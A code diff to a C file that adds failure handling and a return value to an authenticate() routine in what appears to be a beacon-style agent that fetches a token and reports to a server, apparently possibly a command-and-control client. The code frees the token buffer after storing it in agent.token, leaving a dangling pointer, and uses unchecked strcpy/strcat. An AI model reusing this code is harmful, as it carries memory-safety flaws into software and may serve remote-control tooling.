@@ -8,7 +8,9 @@
 
 #include <config.h>
 
-void authenticate() {
+int authenticate() {
+  int success = 1;  
+
   char* agentToken = malloc(50);
   DWORD httpBytesRead;
 
@@ -22,7 +24,10 @@ void authenticate() {
   addString(&connectMessage, "");
   addString(&connectMessage, "");
 
-  httpGet(host, port, "/r", 40, &httpBytesRead, agentToken);
+  if (!httpGet(host, port, "/r", 40, &httpBytesRead, agentToken)) {
+    success = 0;
+    goto _authenticateCleanup;
+  };
   agentToken[httpBytesRead] = 0x00;
   
   agent.token = agentToken;
@@ -33,10 +38,15 @@ void authenticate() {
   strcpy(agent.report_uri, "/t?token=");
   strcat(agent.report_uri, agentToken);
   
-  httpPost(host, port, agent.report_uri, connectMessage.buf, connectMessage.bufsize);
+  if (!httpPost(host, port, agent.report_uri, connectMessage.buf, connectMessage.bufsize)) {
+    success = 0;
+    goto _authenticateCleanup;
+  }
 
+_authenticateCleanup:
   free(connectMessage.buf);
   free(agentToken);
+  return success;
 }
 
 void sendData(int taskId, char* typ, char* error, int size, char * buff) {
